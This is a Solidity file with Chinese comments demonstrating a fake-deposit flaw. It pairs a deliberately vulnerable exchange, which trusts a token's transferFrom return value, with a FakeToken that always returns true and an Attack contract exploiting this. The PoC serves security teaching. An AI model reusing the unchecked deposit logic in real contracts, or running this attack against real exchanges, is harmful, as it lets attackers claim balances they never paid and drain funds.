pragma solidity >=0.8.0;
// SPDX-License-Identifier: UNLICENSED

// 此 interface 為簡化版本的 ERC20 interface
interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * VulnerableExchange 合約存在漏洞: Missing Token Verification of Exchange
 *
 * 問題描述：
 * 當 depositToken 函式呼叫傳入的 token 合約的 transferFrom 時，僅檢查回傳值，不確認是否真正扣除使用者的 token。
 * 如果攻擊者使用偽造的 ERC20 Token (FakeToken)，即使不執行真實扣減，transferFrom 也會回傳 true，從而進行假存款。
 *
 * 攻擊流程：
 * 1. 攻擊者部署 FakeToken 合約，該合約在 transferFrom 時只回傳 true，不對餘額做任何改變。
 * 2. 攻擊者使用 FakeToken 的地址向 VulnerableExchange 進行 depositToken 存款。
 * 3. VulnerableExchange 合約以為 depositToken 成功，直接更新內部數據，但實際上沒有真正取得 token。
 */
contract VulnerableExchange {
    // tokens[token 地址][使用者地址] = deposit 金額
    mapping(address => mapping(address => uint256)) public tokens;

    // Deposit 事件，用來紀錄存款行為
    event Deposit(address indexed token, address indexed user, uint256 amount, uint256 balance);

    // depositToken 函式有漏洞，未能確認真實的 token 轉移情況
    // 將此函式標記為 payable 以解決編譯中對 msg.value 的引用問題
    function depositToken(address token, uint256 amount) public payable {
        // 雖然本來 non-payable 亦可達到此檢查，但必須使用 payable 才能讀取 msg.value
        require(msg.value == 0, "No Ether allowed");
        require(token != address(0), "Invalid token address");

        // 漏洞關鍵：僅檢查 transferFrom 回傳 true ，未驗證 token 是否真的轉移
        bool success = IERC20(token).transferFrom(msg.sender, address(this), amount);
        require(success, "transferFrom failed");

        // 更新 deposit 狀態，但攻擊者可利用 FakeToken 的漏洞進行假存款
        tokens[token][msg.sender] += amount;
        emit Deposit(token, msg.sender, amount, tokens[token][msg.sender]);
    }
}

/**
 * FakeToken 合約為偽造的 ERC20 Token，用於模擬攻擊行為
 *
 * 實作說明：
 * transferFrom 函式在此版本僅回傳 true，不對餘額進行扣減，從而使 VulnerableExchange 誤以為 token 已成功轉移。
 */
contract FakeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // 建構子給予創建者初始餘額
    constructor() {
        balanceOf[msg.sender] = 1000000 ether;
    }

    // 漏洞處：transferFrom 未扣減實際餘額，只回傳 true
    function transferFrom(address /*from*/, address /*to*/, uint256 /*amount*/) public pure returns (bool) {
        // 攻擊重點：不檢查也不扣減 from 的餘額
        return true;
    }
}

/**
 * Attack 合約示範如何利用上述漏洞進行假存款攻擊
 *
 * 攻擊步驟：
 * 1. 部署 VulnerableExchange 合約
 * 2. 攻擊者部署 Attack 合約並將 VulnerableExchange 的地址傳入
 * 3. Attack 合約內部建立一個 FakeToken 合約
 * 4. 攻擊者呼叫 executeAttack，利用 FakeToken 的 transferFrom 漏洞向 VulnerableExchange 進行 depositToken 存款
 */
contract Attack {
    VulnerableExchange public vulnerableExchange;
    FakeToken public fakeToken;
    address public owner;

    constructor(VulnerableExchange _vulnerableExchange) {
        vulnerableExchange = _vulnerableExchange;
        fakeToken = new FakeToken();
        owner = msg.sender;
    }

    // executeAttack 觸發 depositToken，利用偽造 token 進行虛假存款
    function executeAttack(uint256 depositAmount) public {
        // 因為 FakeToken 的 transferFrom 不做餘額檢查，所以無需預先 approve
        vulnerableExchange.depositToken{value: 0}(address(fakeToken), depositAmount);
    }
}
